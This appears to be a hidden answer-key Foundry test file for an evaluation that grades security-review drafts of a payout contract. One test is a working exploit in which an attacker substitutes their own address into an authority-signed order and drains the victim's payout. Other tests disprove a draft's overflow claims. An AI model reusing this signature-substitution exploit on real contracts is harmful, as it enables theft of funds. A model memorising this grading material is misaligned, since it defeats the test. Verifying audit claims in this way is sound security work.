// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// Answer-key proofs for the Lanternreel draft-review pair (ReelPayoutDesk).
//   test_accurate_B1*    the defect the accurate draft reports is real, through the public entry point
//   test_falseclaim_C1*  the overflow is NOT reachable through processOrder()
//   test_falseclaim_C2*  the overflow was NOT observed on the unmodified contract (harness only)
//   test_falseclaim_C3*  an unprivileged account gains nothing: no credit, no withdrawal, reserve intact
// Never copied into a case workspace.

import "forge-std/Test.sol";
import "../src/ReelPayoutDesk.sol";
import "../src/PayoutOrderLib.sol";

contract ProofToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// The wrapper the overclaimed draft deploys, reproduced to show it is a different contract.
contract ProofHarness is ReelPayoutDesk {
    constructor(address _owner, address _authority, address _token) ReelPayoutDesk(_owner, _authority, _token) {}

    function exposeAllocateFunds(address creator, uint256 amount) external {
        _allocateFunds(creator, amount);
    }
}

contract ProofTest is Test {
    uint256 constant RESERVE = 250_000 ether;
    uint256 constant AUTHORITY_KEY = 0xA11CE5;
    uint256 constant ATTACKER_KEY = 0xBADC0DE;

    event OrderProcessed(uint256 indexed orderId, address indexed creator, uint256 amount);

    ReelPayoutDesk desk;
    ProofToken token;
    address authority;
    address attacker;
    address owner = makeAddr("owner");
    address funder = makeAddr("funder");
    address victim = makeAddr("victim");
    address creator = makeAddr("creator");

    function setUp() public {
        authority = vm.addr(AUTHORITY_KEY);
        attacker = vm.addr(ATTACKER_KEY);
        token = new ProofToken();
        desk = new ReelPayoutDesk(owner, authority, address(token));

        token.mint(funder, RESERVE);
        vm.startPrank(funder);
        token.approve(address(desk), RESERVE);
        desk.fundReserve(RESERVE);
        vm.stopPrank();
    }

    // ------------------------------------------------------------------ helpers

    function _order(uint256 id, address to, uint256 amount) internal view returns (PayoutOrder memory) {
        return PayoutOrder({orderId: id, creator: to, amount: amount, deadline: uint64(block.timestamp + 3 days)});
    }

    function _sign(uint256 key, PayoutOrder memory order) internal view returns (bytes memory) {
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(key, desk.getOrderDigest(order));
        return abi.encodePacked(r, s, v);
    }

    // ------------------------------------------------------------------ accurate draft (B1)

    /// Same scenario and numbers as the accurate draft's PoC: order #7, 40,000 tokens, issued to the victim.
    function test_accurate_B1() public {
        PayoutOrder memory order = _order(7, victim, 40_000 ether);
        bytes memory signature = _sign(AUTHORITY_KEY, order);

        PayoutOrder memory attackerOrder = _order(7, attacker, 40_000 ether);
        // the creator field is outside the signed digest
        assertEq(desk.getOrderDigest(attackerOrder), desk.getOrderDigest(order), "digest ignores creator");

        // unprivileged attacker, public entry point, unmodified contract
        assertTrue(attacker != owner && attacker != authority, "attacker holds no role");
        vm.expectEmit(true, true, false, true, address(desk));
        emit OrderProcessed(7, attacker, 40_000 ether);
        vm.prank(attacker);
        desk.processOrder(attackerOrder, signature);
        assertEq(desk.balanceOf(attacker), 40_000 ether, "attacker credited");

        vm.prank(attacker);
        desk.withdraw(40_000 ether);

        vm.prank(victim);
        vm.expectRevert(ReelPayoutDesk.OrderAlreadyProcessed.selector);
        desk.processOrder(order, signature);

        console2.log("B1 attacker token balance:", token.balanceOf(attacker));
        console2.log("B1 victim token balance  :", token.balanceOf(victim));
        console2.log("B1 victim desk balance   :", desk.balanceOf(victim));
        console2.log("B1 desk reserve          :", token.balanceOf(address(desk)));
        console2.log("B1 totalAllocated        :", desk.totalAllocated());

        assertEq(token.balanceOf(attacker), 40_000 ether, "attacker holds the victim's payout");
        assertEq(token.balanceOf(victim), 0, "victim received nothing");
        assertEq(desk.balanceOf(victim), 0, "victim has no desk balance");
        assertEq(token.balanceOf(address(desk)), RESERVE - 40_000 ether, "reserve paid exactly one order");
        // the amount is one the authority did sign: issuance stays within what was authorised
        assertEq(desk.totalAllocated(), 40_000 ether, "no issuance beyond the signed amount");
    }

    /// Control: without interference the victim is paid the same order.
    function test_control_B1_honestOrderPaysCreator() public {
        PayoutOrder memory order = _order(7, victim, 40_000 ether);
        bytes memory signature = _sign(AUTHORITY_KEY, order);

        vm.startPrank(victim);
        desk.processOrder(order, signature);
        desk.withdraw(40_000 ether);
        vm.stopPrank();

        assertEq(token.balanceOf(victim), 40_000 ether);
        assertEq(desk.totalOwed(), 0);
    }

    /// Control: every other field IS signed, so only the recipient can be swapped (severity stays High, not Critical).
    function test_control_B1_otherFieldsAreSigned() public {
        PayoutOrder memory order = _order(7, victim, 40_000 ether);
        bytes memory signature = _sign(AUTHORITY_KEY, order);

        PayoutOrder memory bigger = _order(7, attacker, 40_000 ether + 1);
        vm.prank(attacker);
        vm.expectRevert(ReelPayoutDesk.InvalidAuthority.selector);
        desk.processOrder(bigger, signature);

        PayoutOrder memory otherId = _order(8, attacker, 40_000 ether);
        vm.prank(attacker);
        vm.expectRevert(ReelPayoutDesk.InvalidAuthority.selector);
        desk.processOrder(otherId, signature);

        PayoutOrder memory later = _order(7, attacker, 40_000 ether);
        later.deadline += 1;
        vm.prank(attacker);
        vm.expectRevert(ReelPayoutDesk.InvalidAuthority.selector);
        desk.processOrder(later, signature);

        // and a third party cannot submit the order as-is on the victim's behalf either
        vm.prank(attacker);
        vm.expectRevert(ReelPayoutDesk.NotOrderCreator.selector);
        desk.processOrder(order, signature);
    }

    // ------------------------------------------------------------------ overclaimed draft, claim C1

    /// The draft's own amount (2**256 - 400e18), even when the authority itself signs it, is stopped by
    /// the per-order ceiling the draft quotes. Nothing reaches _allocateFunds().
    function test_falseclaim_C1_guardRevertsPublicPath() public {
        // same starting point as the draft: 1,000 tokens already allocated to a creator
        PayoutOrder memory first = _order(1, creator, 1_000 ether);
        bytes memory firstSig = _sign(AUTHORITY_KEY, first);
        vm.prank(creator);
        desk.processOrder(first, firstSig);
        assertEq(desk.totalAllocated(), 1_000 ether);

        uint256 hugeAmount = type(uint256).max - 400 ether + 1;
        PayoutOrder memory huge = _order(2, attacker, hugeAmount);
        bytes memory hugeSig = _sign(AUTHORITY_KEY, huge);
        vm.prank(attacker);
        vm.expectRevert(ReelPayoutDesk.ValueExceedsOrderCeiling.selector);
        desk.processOrder(huge, hugeSig);

        // one wei above the ceiling is already rejected
        PayoutOrder memory justOver = _order(3, attacker, desk.ORDER_CEILING() + 1);
        bytes memory justOverSig = _sign(AUTHORITY_KEY, justOver);
        vm.prank(attacker);
        vm.expectRevert(ReelPayoutDesk.ValueExceedsOrderCeiling.selector);
        desk.processOrder(justOver, justOverSig);

        console2.log("C1 totalAllocated after rejected orders:", desk.totalAllocated());
        console2.log("C1 attacker desk balance               :", desk.balanceOf(attacker));
        assertEq(desk.totalAllocated(), 1_000 ether, "total unchanged");
        assertEq(desk.balanceOf(attacker), 0, "attacker not credited");
        assertFalse(desk.orderProcessed(2));
        assertFalse(desk.orderProcessed(3));
    }

    /// The running total cannot pass issuanceLimit through the public path: the comparison uses checked
    /// arithmetic on the value before the addition, so the total lands exactly on the limit and then stops.
    function test_falseclaim_C1_totalStopsAtIssuanceLimit() public {
        vm.prank(owner);
        desk.setIssuanceLimit(300_000 ether);

        for (uint256 i = 1; i <= 4; i++) {
            PayoutOrder memory order = _order(i, creator, 75_000 ether);
            bytes memory sig = _sign(AUTHORITY_KEY, order);
            vm.prank(creator);
            desk.processOrder(order, sig);
        }
        assertEq(desk.totalAllocated(), 300_000 ether);
        assertEq(desk.remainingHeadroom(), 0);

        PayoutOrder memory oneMore = _order(5, creator, 1);
        bytes memory oneMoreSig = _sign(AUTHORITY_KEY, oneMore);
        vm.prank(creator);
        vm.expectRevert(ReelPayoutDesk.ValueExceedsIssuanceLimit.selector);
        desk.processOrder(oneMore, oneMoreSig);

        // the owner cannot raise the limit beyond the hard constant either
        uint256 hardLimit = desk.ALLOCATION_HARD_LIMIT();
        vm.prank(owner);
        vm.expectRevert(ReelPayoutDesk.LimitOutOfRange.selector);
        desk.setIssuanceLimit(hardLimit + 1);

        console2.log("C1 totalAllocated at the limit:", desk.totalAllocated());
        console2.log("C1 hard limit                 :", hardLimit);
        console2.log("C1 2**256 / hard limit        :", type(uint256).max / hardLimit);
        assertEq(desk.totalAllocated(), desk.issuanceLimit());
        assertLt(hardLimit, 2 ** 86, "the largest reachable total needs 86 bits, not 256");
    }

    /// For ANY amount carried by an authority-signed order, processOrder() either reverts or adds exactly
    /// that amount with amount <= ORDER_CEILING and total <= issuanceLimit. No wrap is possible.
    function testFuzz_falseclaim_C1_publicPathNeverWraps(uint256 amountA, uint256 amountB) public {
        uint256[2] memory amounts = [amountA, amountB];
        for (uint256 i = 0; i < 2; i++) {
            PayoutOrder memory order = _order(100 + i, attacker, amounts[i]);
            bytes memory sig = _sign(AUTHORITY_KEY, order);
            uint256 totalBefore = desk.totalAllocated();
            uint256 balanceBefore = desk.balanceOf(attacker);

            vm.prank(attacker);
            (bool ok,) = address(desk).call(abi.encodeCall(ReelPayoutDesk.processOrder, (order, sig)));

            if (ok) {
                assertLe(amounts[i], desk.ORDER_CEILING(), "accepted amount is within the ceiling");
                assertEq(desk.totalAllocated(), totalBefore + amounts[i], "total grew by exactly the amount");
                assertEq(desk.balanceOf(attacker), balanceBefore + amounts[i], "balance grew by exactly the amount");
            } else {
                assertEq(desk.totalAllocated(), totalBefore, "total unchanged on revert");
                assertEq(desk.balanceOf(attacker), balanceBefore, "balance unchanged on revert");
            }
            assertLe(desk.totalAllocated(), desk.issuanceLimit(), "total never passes the limit");
            assertGe(desk.totalAllocated(), totalBefore, "total never decreases");
        }
    }

    // ------------------------------------------------------------------ overclaimed draft, claim C2

    /// The function the draft's PoC calls does not exist on the unmodified contract; the wrapper is a
    /// different contract with different runtime code.
    function test_falseclaim_C2_overflowOnlyThroughHarness() public {
        ProofHarness harness = new ProofHarness(owner, authority, address(token));
        uint256 hugeAmount = type(uint256).max - 400 ether + 1;
        bytes memory forwardCall = abi.encodeWithSignature("exposeAllocateFunds(address,uint256)", attacker, hugeAmount);

        // on the wrapper: succeeds and credits the huge balance (what the draft's PoC shows)
        vm.prank(attacker);
        (bool onHarness,) = address(harness).call(forwardCall);
        assertTrue(onHarness, "the wrapper exposes the internal function");
        assertEq(harness.balanceOf(attacker), hugeAmount);

        // on the contract as written: no such function, nothing changes
        vm.prank(attacker);
        (bool onDesk,) = address(desk).call(forwardCall);
        assertFalse(onDesk, "the unmodified contract has no such entry point");
        assertEq(desk.balanceOf(attacker), 0);
        assertEq(desk.totalAllocated(), 0);

        bytes4 selector = bytes4(keccak256("exposeAllocateFunds(address,uint256)"));
        assertTrue(_contains(address(harness).code, selector), "selector present in the wrapper");
        assertFalse(_contains(address(desk).code, selector), "selector absent from the unmodified contract");
        assertTrue(address(harness).codehash != address(desk).codehash, "different runtime code");

        console2.log("C2 call on wrapper succeeded      :", onHarness);
        console2.log("C2 call on unmodified desk worked :", onDesk);
        console2.log("C2 unmodified desk attacker credit:", desk.balanceOf(attacker));
    }

    // ------------------------------------------------------------------ overclaimed draft, claim C3

    /// An account with no role and no authority signature is credited nothing and withdraws nothing.
    function test_falseclaim_C3_unprivilegedAttackerDeltaIsZero() public {
        uint256 reserveBefore = token.balanceOf(address(desk));
        uint256 attackerBefore = token.balanceOf(attacker);

        // self-signed order for the draft's huge amount
        PayoutOrder memory huge = _order(1, attacker, type(uint256).max - 400 ether + 1);
        bytes memory hugeSig = _sign(ATTACKER_KEY, huge);
        vm.prank(attacker);
        vm.expectRevert(ReelPayoutDesk.ValueExceedsOrderCeiling.selector);
        desk.processOrder(huge, hugeSig);

        // self-signed order inside the ceiling
        PayoutOrder memory small = _order(2, attacker, 75_000 ether);
        bytes memory smallSig = _sign(ATTACKER_KEY, small);
        vm.prank(attacker);
        vm.expectRevert(ReelPayoutDesk.InvalidAuthority.selector);
        desk.processOrder(small, smallSig);

        // nothing to withdraw
        vm.prank(attacker);
        vm.expectRevert(ReelPayoutDesk.InsufficientFunds.selector);
        desk.withdraw(1);

        console2.log("C3 attacker token delta:", token.balanceOf(attacker) - attackerBefore);
        console2.log("C3 reserve delta       :", reserveBefore - token.balanceOf(address(desk)));
        console2.log("C3 totalAllocated      :", desk.totalAllocated());
        assertEq(token.balanceOf(attacker), attackerBefore, "attacker balance delta is zero");
        assertEq(token.balanceOf(address(desk)), reserveBefore, "reserve untouched");
        assertEq(desk.totalAllocated(), 0, "nothing issued");
        assertEq(desk.balanceOf(attacker), 0, "nothing credited");
    }

    function _contains(bytes memory haystack, bytes4 needle) internal pure returns (bool) {
        if (haystack.length < 4) return false;
        for (uint256 i = 0; i <= haystack.length - 4; i++) {
            if (haystack[i] == needle[0] && haystack[i + 1] == needle[1] && haystack[i + 2] == needle[2] && haystack[i + 3] == needle[3]) {
                return true;
            }
        }
        return false;
    }
}
